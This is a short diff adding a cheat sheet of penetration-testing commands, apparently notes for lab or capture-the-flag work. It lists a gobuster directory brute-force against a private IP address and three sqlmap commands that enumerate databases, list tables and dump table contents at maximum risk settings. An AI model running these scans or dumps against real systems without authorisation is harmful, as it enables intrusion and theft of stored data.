@@ -1,0 +1,11 @@
+# gobuster quick format
+gobuster dir -u http://172.16.177.128/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
+
+# sqlmap quick format
+// server enum for multipe dbs hosted there
+sqlmap -u http://example.com/path/to?param=1\&parama=abc --dbs --level=5 --risk=3
+// db enum for tables
+sqlmap -u http://example.com/path/to?param=1\&parama=abc -D dbname --tables
+// for table data dump
+sqlmap -u http://example.com/path/to?param=1\&aparam=abc -D dbname -T tablename --dump
+//auto save
